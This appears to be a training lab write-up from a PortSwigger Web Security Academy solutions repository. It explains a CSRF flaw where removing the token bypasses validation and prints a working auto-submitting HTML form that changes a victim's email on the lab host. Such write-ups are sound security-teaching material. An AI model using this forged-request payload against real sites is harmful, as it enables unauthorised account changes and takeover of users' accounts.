![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/ea499592-be2c-462f-b366-833c9e2edae5)

### Solution

update the email adress and go to the http request

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/347d736f-1fa2-4cb0-a5b1-3960c17b0efb)

if we change/modify the csrf token, we can see that it gets rejected

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/36159186-640a-484e-8379-c73c0335ef99)

but removing it completely and it gets accepted

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/0b57df33-a343-4454-8b8b-58f1ab118ff3)

now right click and generate the csrf poc

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/4f69dfcd-dd6b-4e61-862e-7f16002c329c)

payload

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aee00ad0344619d84e8749e007400b9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="rahul&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

now store it in body of exploit server and view it.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/aa251f2a-53e0-4c2b-8f43-300e59e25c8b)

now deliver to solve the lab

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/e2e4f8db-7deb-4f57-9113-7d6dee065eee)
